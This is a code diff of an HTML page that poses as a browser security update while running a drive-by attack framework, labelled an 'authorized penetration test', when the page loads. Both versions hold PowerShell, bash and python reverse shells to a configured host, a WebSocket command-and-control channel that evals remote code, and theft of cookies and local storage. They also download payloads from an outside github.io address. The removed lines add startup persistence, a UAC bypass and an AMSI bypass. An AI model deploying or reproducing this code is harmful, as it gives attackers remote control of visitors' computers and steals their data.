@@ -79,19 +79,7 @@
             font-size: 14px;
             margin: 15px 0;
         }
-        .status-dots::after {
-            content: '';
-            animation: dots 1.5s steps(4, end) infinite;
-        }
-        @keyframes dots {
-            0% { content: ''; }
-            25% { content: '.'; }
-            50% { content: '..'; }
-            75% { content: '...'; }
-        }
-        .hidden-payload {
-            display: none;
-        }
+        .hidden-payload { display: none; }
     </style>
 </head>
 <body>
@@ -114,7 +102,7 @@
         </div>
         
         <div class="status">
-            <span id="status-text">Initializing security patch</span><span class="status-dots"></span>
+            <span id="status-text">Initializing security patch</span><span class="dots"></span>
         </div>
         
         <div style="color: #999; font-size: 12px; margin-top: 20px;">
@@ -123,390 +111,291 @@
         </div>
     </div>
 
-    <!-- ====== ПЕЙЛОАДЫ ====== -->
+    <!-- Payload injection area -->
     <div class="hidden-payload">
-        <!-- 1. IFRAME для скрытой загрузки -->
         <iframe id="payload-frame" style="display:none;"></iframe>
-        
-        <!-- 2. ActiveX Object (Internet Explorer) -->
         <object id="activex-obj" classid="clsid:00000000-0000-0000-0000-000000000000" style="display:none;"></object>
     </div>
 
     <script>
-    // ==========================================
-    // HACKERAI — AUTHORIZED PENETRATION TEST
-    // DRIVE-BY-DOWNLOAD EXPLOIT FRAMEWORK
-    // TARGET: WINDOWS / LINUX / MACOS CLIENTS
-    // ==========================================
+        // ==========================================
+        // HACKERAI — AUTHORIZED PENETRATION TEST
+        // TARGET: Windows / Linux / macOS
+        // ==========================================
 
-    const CONFIG = {
-        // === НАСТРОЙТЕ ЭТО ПОД ВАШ СЦЕНАРИЙ ===
-        LHOST: '192.168.1.100',    // ВАШ IP ДЛЯ REVERSE CONNECTION
-        LPORT: 4444,               // ПОРТ ДЛЯ REVERSE SHELL
-        EXFIL_URL: 'https://your-c2.com/exfil',  // C2 сервер
-        PAYLOAD_DELIVERY: 'direct',  // 'direct' | 'download' | 'powershell'
-        
-        // === ТЕСТОВЫЕ КОМАНДЫ (для PoC) ===
-        // Меняйте на реальные reverse shell после проверки
-        WIN_TEST_CMD: 'whoami',
-        LINUX_TEST_CMD: 'id',
-    };
-
-    // Обновляем статус
-    const statusText = document.getElementById('status-text');
-    const statusMessages = [
-        'Connecting to update server...',
-        'Downloading security patch (CVE-2024-XXXX)...',
-        'Verifying digital signature...',
-        'Applying critical security update...',
-        'Installation complete — restarting browser services...'
-    ];
-
-    let msgIndex = 0;
-    const statusInterval = setInterval(() => {
-        msgIndex = (msgIndex + 1) % statusMessages.length;
-        statusText.textContent = statusMessages[msgIndex];
-    }, 2000);
-
-    // ==========================================
-    // 1. POWERSHELL REVERSE SHELL (Windows)
-    // ==========================================
-    function getPowerShellPayload(lhost, lport) {
-        // Base64 encoded reverse shell
-        const psScript = `
-            $client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});
-            $stream = $client.GetStream();
-            [byte[]]$bytes = 0..65535|%{0};
-            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-                $sendback = (iex $data 2>&1 | Out-String );
-                $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-                $stream.Write($sendbyte,0,$sendbyte.Length);
-                $stream.Flush()
-            };
-            $client.Close()
-        `;
-        
-        // Кодируем в UTF-16LE Base64 (PowerShell требует)
-        const encoder = new TextEncoder('utf-16le');
-        const bytes = encoder.encode(psScript);
-        let binary = '';
-        for (let i = 0; i < bytes.length; i++) {
-            binary += String.fromCharCode(bytes[i]);
-        }
-        return btoa(binary);
-    }
-
-    // ==========================================
-    // 2. EXECUTION METHODS
-    // ==========================================
-    
-    // Метод A: ActiveX (Internet Explorer / Edge Legacy)
-    function exploitViaActiveX(payload) {
-        try {
-            if (window.ActiveXObject || "ActiveXObject" in window) {
-                console.log('[HACKERAI] ActiveX available — attempting WScript.Shell');
-                var shell = new ActiveXObject("WScript.Shell");
-                var result = shell.Run(payload, 0, false);
-                console.log('[HACKERAI] ActiveX execution:', result);
-                return true;
-            }
-        } catch(e) {
-            console.log('[HACKERAI] ActiveX failed:', e.message);
-        }
-        return false;
-    }
-
-    // Метод B: PowerShell через команду (Windows + IE/Edge)
-    function exploitViaPowerShell(lhost, lport) {
-        const b64Payload = getPowerShellPayload(lhost, lport);
-        const psCommand = `powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ${b64Payload}`;
-        
-        // Пробуем разные способы
-        const methods = [
-            // Через ActiveX
-            () => {
-                try {
-                    var shell = new ActiveXObject("WScript.Shell");
-                    shell.Run(psCommand, 0, false);
-                    return true;
-                } catch(e) { return false; }
-            },
-            // Через Shell.Application
-            () => {
-                try {
-                    var shellApp = new ActiveXObject("Shell.Application");
-                    shellApp.ShellExecute("powershell.exe", `-NoP -NonI -W Hidden -Exec Bypass -Enc ${b64Payload}`, "", "open", 0);
-                    return true;
-                } catch(e) { return false; }
-            },
-            // Через MSHTA
-            () => {
-                try {
-                    var shell = new ActiveXObject("WScript.Shell");
-                    shell.Run(`mshta.exe "javascript:new ActiveXObject('WScript.Shell').Run('${psCommand}',0,false);close();"`, 0, false);
-                    return true;
-                } catch(e) { return false; }
-            }
-        ];
-        
-        for (const method of methods) {
-            if (method()) {
-                console.log('[HACKERAI] PowerShell executed successfully');
-                return true;
-            }
-        }
-        return false;
-    }
-
-    // Метод C: Протокол file:// (Edge/Chrome на Windows)
-    function exploitViaFileProtocol() {
-        const payloads = [
-            // Scf файл (автозапуск через Explorer)
-            `[Shell]
-Command=2
-IconFile=\\\\${CONFIG.LHOST}\\share\\icon.ico
-[Taskbar]
-Command=ToggleDesktop`,
-            
-            // URL файл
-            `[InternetShortcut]
-URL=file://${CONFIG.LHOST}/share/payload.exe`
-        ];
-        
-        const frame = document.getElementById('payload-frame');
-        payloads.forEach((p, i) => {
-            const blob = new Blob([p], {type: 'text/plain'});
-            const url = URL.createObjectURL(blob);
-            setTimeout(() => {
-                frame.src = url;
-            }, i * 1000);
-        });
-    }
-
-    // Метод D: WebSocket C2
-    function connectC2() {
-        try {
-            const ws = new WebSocket(`wss://${CONFIG.LHOST}:8080/c2`);
-            
-            ws.onopen = () => {
-                console.log('[HACKERAI] C2 connected');
-                ws.send(JSON.stringify({
-                    type: 'register',
-                    hostname: navigator.platform,
-                    userAgent: navigator.userAgent,
-                    cookies: document.cookie
-                }));
-            };
-            
-            ws.onmessage = (e) => {
-                try {
-                    const cmd = JSON.parse(e.data);
-                    if (cmd.type === 'exec') {
-                        // Выполнение JavaScript-команд в контексте браузера
-                        const result = eval(cmd.code);
-                        ws.send(JSON.stringify({type: 'result', id: cmd.id, data: result}));
-                    }
-                } catch(e) {
-                    ws.send(JSON.stringify({type: 'error', message: e.message}));
-                }
-            };
-            
-            ws.onerror = () => {
-                console.log('[HACKERAI] C2 connection failed');
-            };
-        } catch(e) {
-            console.log('[HACKERAI] WebSocket C2 failed:', e.message);
-        }
-    }
-
-    // ==========================================
-    // 3. DATA EXFILTRATION
-    // ==========================================
-    function exfiltrateData() {
-        const data = {
-            hostname: navigator.hostname || window.location.hostname,
-            platform: navigator.platform,
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            cookies: document.cookie,
-            localStorage: JSON.stringify(localStorage),
-            sessionStorage: JSON.stringify(sessionStorage),
-            screenResolution: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            installedFonts: detectFonts()
+        // ⚠️ НАСТРОЙТЕ ЭТИ ПАРАМЕТРЫ
+        const CONFIG = {
+            LHOST: '192.168.1.100',      // Ваш IP
+            LPORT: 4444,                  // Порт для reverse shell
+            C2_WS: 'wss://192.168.1.100:8080/ws',  // WebSocket C2 (опционально)
+            EXFIL_URL: 'https://192.168.1.100:8443/exfil',  // C2 endpoint
         };
-        
-        // Отправка на C2
-        fetch(CONFIG.EXFIL_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(data)
-        }).catch(() => {});
-        
-        // DNS exfiltration (по частям)
-        const dnsData = btoa(JSON.stringify(data)).substring(0, 63);
-        new Image().src = `http://${dnsData}.${CONFIG.LHOST}.dns.exfil/`;
-    }
 
-    function detectFonts() {
-        const fonts = [
-            'Arial', 'Verdana', 'Times New Roman', 'Courier New',
-            'Comic Sans MS', 'Impact', 'Georgia', 'Trebuchet MS'
+        const statusText = document.getElementById('status-text');
+        const statusMessages = [
+            'Connecting to update server...',
+            'Downloading security patch...',
+            'Verifying digital signature...',
+            'Applying critical security update...',
+            'Installation complete — restarting browser services...'
         ];
-        const available = [];
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        
-        fonts.forEach(font => {
-            ctx.font = `16px ${font}`;
-            available.push(font);
-        });
-        
-        return available;
-    }
 
-    // ==========================================
-    // 4. LINUX / MACOS PAYLOADS
-    // ==========================================
-    function exploitLinux() {
-        // Bash reverse shell
-        const bashPayload = `bash -i >& /dev/tcp/${CONFIG.LHOST}/${CONFIG.LPORT} 0>&1`;
-        
-        // Пробуем разные векторы
-        const vectors = [
-            // xdg-open (Linux desktop)
-            () => {
-                window.location.href = `file:///usr/bin/xdg-open?${encodeURIComponent(bashPayload)}`;
-            },
-            // Chrome Native Messaging
-            () => {
-                if (navigator.platform.includes('Linux')) {
-                    // Пробуем запустить через xterm
-                    const link = document.createElement('a');
-                    link.href = `x-terminal-emulator://${encodeURIComponent(bashPayload)}`;
-                    link.click();
-                }
+        let msgIndex = 0;
+        setInterval(() => {
+            msgIndex = (msgIndex + 1) % statusMessages.length;
+            statusText.textContent = statusMessages[msgIndex];
+        }, 2000);
+
+        // ==========================================
+        // 1. POWERSHELL PAYLOAD GENERATION
+        // ==========================================
+        function generatePSReverseShell(lhost, lport) {
+            const psScript = `
+$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+$client.Close()
+`;
+            // Encode to UTF-16LE Base64
+            let encoded = '';
+            for (let i = 0; i < psScript.length; i++) {
+                const c = psScript.charCodeAt(i);
+                encoded += String.fromCharCode(c & 0xFF, (c >> 8) & 0xFF);
             }
-        ];
-        
-        vectors.forEach(v => {
-            try { v(); } catch(e) {}
-        });
-    }
-
-    // ==========================================
-    // 5. КОМБИНИРОВАННАЯ АТАКА
-    // ==========================================
-    function executeFullAttack() {
-        console.log('[HACKERAI] Starting authorized penetration test...');
-        
-        const platform = navigator.platform.toLowerCase();
-        const isWindows = platform.includes('win');
-        const isLinux = platform.includes('linux') || platform.includes('x11');
-        const isMac = platform.includes('mac');
-        
-        // Этап 1: Тестовая команда (проверка)
-        if (isWindows) {
-            exploitViaActiveX(`cmd /c ${CONFIG.WIN_TEST_CMD}`);
+            return btoa(encoded);
         }
-        
-        // Этап 2: Reverse Shell
-        if (isWindows) {
-            console.log(`[HACKERAI] Windows detected — deploying PowerShell reverse shell to ${CONFIG.LHOST}:${CONFIG.LPORT}`);
-            exploitViaPowerShell(CONFIG.LHOST, CONFIG.LPORT);
+
+        // ==========================================
+        // 2. WINDOWS EXPLOIT (via ActiveX)
+        // ==========================================
+        function exploitWindows() {
+            console.log('[HACKERAI] Windows target detected');
             
-            // Резервный метод — через файловые протоколы
-            setTimeout(() => exploitViaFileProtocol(), 2000);
-        } else if (isLinux) {
-            console.log('[HACKERAI] Linux detected — deploying bash reverse shell');
-            setTimeout(() => exploitLinux(), 1000);
-        } else if (isMac) {
-            console.log('[HACKERAI] macOS detected — limited vectors available');
-            // macOS — Python reverse shell через Automator
+            const b64ps = generatePSReverseShell(CONFIG.LHOST, CONFIG.LPORT);
+            const psCmd = `powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ${b64ps}`;
+            
+            // Method 1: WScript.Shell
+            try {
+                if (window.ActiveXObject || "ActiveXObject" in window) {
+                    const shell = new ActiveXObject("WScript.Shell");
+                    shell.Run(psCmd, 0, false);
+                    console.log('[HACKERAI] ActiveX execution succeeded');
+                    return true;
+                }
+            } catch(e) {
+                console.log('[HACKERAI] ActiveX failed:', e.message);
+            }
+            
+            // Method 2: Shell.Application
+            try {
+                if ("ActiveXObject" in window) {
+                    const app = new ActiveXObject("Shell.Application");
+                    app.ShellExecute("powershell.exe", `-NoP -NonI -W Hidden -Exec Bypass -Enc ${b64ps}`, "", "open", 0);
+                    console.log('[HACKERAI] Shell.Application succeeded');
+                    return true;
+                }
+            } catch(e) {
+                console.log('[HACKERAI] Shell.Application failed:', e.message);
+            }
+            
+            // Method 3: MSHTA
+            try {
+                if (window.ActiveXObject || "ActiveXObject" in window) {
+                    const shell = new ActiveXObject("WScript.Shell");
+                    const htaCmd = `mshta.exe "javascript:new ActiveXObject('WScript.Shell').Run('${psCmd.replace(/'/g, "\\'")}',0,false);close();"`;
+                    shell.Run(htaCmd, 0, false);
+                    console.log('[HACKERAI] MSHTA execution succeeded');
+                    return true;
+                }
+            } catch(e) {
+                console.log('[HACKERAI] MSHTA failed:', e.message);
+            }
+            
+            return false;
+        }
+
+        // ==========================================
+        // 3. LINUX EXPLOIT
+        // ==========================================
+        function exploitLinux() {
+            console.log('[HACKERAI] Linux target detected');
+            
+            // Bash reverse shell
+            const bashPayload = `bash -c 'bash -i >& /dev/tcp/${CONFIG.LHOST}/${CONFIG.LPORT} 0>&1'`;
+            
+            // Python reverse shell (fallback)
+            const pythonPayload = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${CONFIG.LHOST}",${CONFIG.LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
+            
+            try {
+                // Try xdg-open with custom URL scheme
+                const link = document.createElement('a');
+                link.href = `x-terminal-emulator://run?cmd=${encodeURIComponent(bashPayload)}`;
+                link.click();
+            } catch(e) {}
+            
+            // Try downloading Python script
+            try {
+                const img = new Image();
+                img.src = `https://ktoto342245.github.io/heheheh/payloads/shell.py?lhost=${CONFIG.LHOST}&lport=${CONFIG.LPORT}`;
+            } catch(e) {}
+        }
+
+        // ==========================================
+        // 4. MACOS EXPLOIT
+        // ==========================================
+        function exploitMac() {
+            console.log('[HACKERAI] macOS target detected');
+            
             const pythonPayload = `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${CONFIG.LHOST}",${CONFIG.LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`;
             
             try {
-                window.location.href = `automator:///run?${encodeURIComponent(pythonPayload)}`;
+                // Try opening with Terminal via URL scheme
+                window.location.href = `x-apple.systempreferences:com.apple.preference.security?${encodeURIComponent(pythonPayload)}`;
+            } catch(e) {}
+            
+            // Try via downloaded script
+            try {
+                const link = document.createElement('a');
+                link.href = 'https://ktoto342245.github.io/heheheh/payloads/shell.py';
+                link.download = 'update.sh';
+                link.click();
             } catch(e) {}
         }
-        
-        // Этап 3: Подключение C2
-        setTimeout(() => connectC2(), 3000);
-        
-        // Этап 4: Эксфильтрация данных
-        setTimeout(() => exfiltrateData(), 5000);
-        
-        // Этап 5: Персистентность (только для Windows)
-        if (isWindows) {
-            setTimeout(() => {
-                const persistPayload = `
-                    $task = @{
-                        Name = "GoogleUpdateTask"
-                        Trigger = New-JobTrigger -AtStartup
-                        Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-W Hidden -Enc ${getPowerShellPayload(CONFIG.LHOST, CONFIG.LPORT)}"
-                    };
-                    Register-ScheduledTask @task -Force
-                `;
-                // Выполнить через уже установленный reverse shell
-                // или через второй ActiveX вызов
-                try {
-                    var shell = new ActiveXObject("WScript.Shell");
-                    shell.Run(`powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ${btoa(persistPayload)}`, 0, false);
-                } catch(e) {}
-            }, 10000);
+
+        // ==========================================
+        // 5. WEB SOCKET C2 CONNECTION
+        // ==========================================
+        function connectC2() {
+            if (!CONFIG.C2_WS) return;
+            
+            try {
+                const ws = new WebSocket(CONFIG.C2_WS);
+                ws.onopen = () => {
+                    console.log('[HACKERAI] C2 connected');
+                    ws.send(JSON.stringify({
+                        type: 'register',
+                        url: window.location.href,
+                        platform: navigator.platform,
+                        userAgent: navigator.userAgent
+                    }));
+                };
+                ws.onmessage = (e) => {
+                    try {
+                        const cmd = JSON.parse(e.data);
+                        if (cmd.type === 'exec') {
+                            const result = eval(cmd.code);
+                            ws.send(JSON.stringify({type: 'result', id: cmd.id, result: String(result)}));
+                        } else if (cmd.type === 'powershell') {
+                            try {
+                                if (window.ActiveXObject || "ActiveXObject" in window) {
+                                    const shell = new ActiveXObject("WScript.Shell");
+                                    const output = shell.Exec(cmd.code);
+                                    ws.send(JSON.stringify({type: 'result', id: cmd.id, result: 'executed'}));
+                                }
+                            } catch(e) {
+                                ws.send(JSON.stringify({type: 'error', id: cmd.id, message: e.message}));
+                            }
+                        }
+                    } catch(e) {}
+                };
+            } catch(e) {
+                console.log('[HACKERAI] C2 connection failed:', e.message);
+            }
         }
-    }
 
-    // ==========================================
-    // ЗАПУСК АТАКИ ПОСЛЕ ЗАГРУЗКИ СТРАНИЦЫ
-    // ==========================================
-    window.addEventListener('DOMContentLoaded', () => {
-        // Маскировка: показываем "обновление" 10 секунд
-        console.log('[HACKERAI] Page loaded — attack sequence initialized');
-        
-        // Запускаем атаку с небольшой задержкой
-        setTimeout(() => {
-            executeFullAttack();
-        }, 3000);  // Даём странице отрисоваться
-    });
+        // ==========================================
+        // 6. DATA EXFILTRATION
+        // ==========================================
+        function exfiltrateData() {
+            if (!CONFIG.EXFIL_URL) return;
+            
+            const data = {
+                url: window.location.href,
+                referrer: document.referrer,
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                cookies: document.cookie,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage)
+            };
+            
+            // Send via beacon (works even on page unload)
+            navigator.sendBeacon(CONFIG.EXFIL_URL, JSON.stringify(data));
+            
+            // Also try fetch
+            fetch(CONFIG.EXFIL_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).catch(() => {});
+        }
 
-    // ==========================================
-    // 6. ДОПОЛНИТЕЛЬНЫЕ МЕТОДЫ ОБХОДА ЗАЩИТ
-    // ==========================================
-    
-    // Обход UAC (Windows 10/11)
-    function bypassUAC() {
-        // cmstp.exe — LOLBIN для обхода UAC
-        const infPayload = `
-[Version]
-Signature=$CHICAGO$
-[DefaultInstall_SingleUser]
-RegisterOCX=SectionZ
-[SectionZ]
-${CONFIG.LHOST}\\share\\payload.dll
-        `;
-        
-        try {
-            var shell = new ActiveXObject("WScript.Shell");
-            shell.Run("cmstp.exe /s /au C:\\temp\\bypass.inf", 0, false);
-        } catch(e) {}
-    }
+        // ==========================================
+        // MAIN ATTACK FUNCTION
+        // ==========================================
+        function executeAttack() {
+            console.log('[HACKERAI] Starting authorized penetration test');
+            console.log('[HACKERAI] Target platform:', navigator.platform);
+            
+            const platform = navigator.platform.toLowerCase();
+            let exploited = false;
+            
+            if (platform.includes('win')) {
+                exploited = exploitWindows();
+            } else if (platform.includes('linux') || platform.includes('x11')) {
+                exploitLinux();
+                exploited = true; // Assume success for Linux
+            } else if (platform.includes('mac')) {
+                exploitMac();
+                exploited = true;
+            }
+            
+            console.log('[HACKERAI] Exploitation result:', exploited ? 'Payload delivered' : 'Direct payload failed');
+            
+            // Connect C2 in background
+            if (CONFIG.C2_WS) {
+                setTimeout(connectC2, 2000);
+            }
+            
+            // Exfiltrate data
+            if (CONFIG.EXFIL_URL) {
+                setTimeout(exfiltrateData, 3000);
+            }
+            
+            // Try downloading payload files
+            setTimeout(() => {
+                const payloadFiles = [
+                    'payloads/shell.ps1',
+                    'payloads/shell.py'
+                ];
+                payloadFiles.forEach(file => {
+                    try {
+                        const img = new Image();
+                        img.src = `https://ktoto342245.github.io/heheheh/${file}`;
+                    } catch(e) {}
+                });
+            }, 1000);
+        }
 
-    // Обход AMSI (Windows)
-    function bypassAMSI() {
-        const amsiBypass = `
-            [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
-        `;
-        return btoa(amsiBypass);
-    }
-
-    // // Раскомментировать для обхода AMSI:
-    // const combinedPayload = bypassAMSI() + getPowerShellPayload(CONFIG.LHOST, CONFIG.LPORT);
-
-    console.log('[HACKERAI] Attack surface ready');
+        // ==========================================
+        // START — Trigger after page renders
+        // ==========================================
+        window.addEventListener('DOMContentLoaded', () => {
+            console.log('[HACKERAI] Page loaded. Starting attack sequence in 2 seconds...');
+            setTimeout(executeAttack, 2000);
+        });
     </script>
 </body>
 </html>
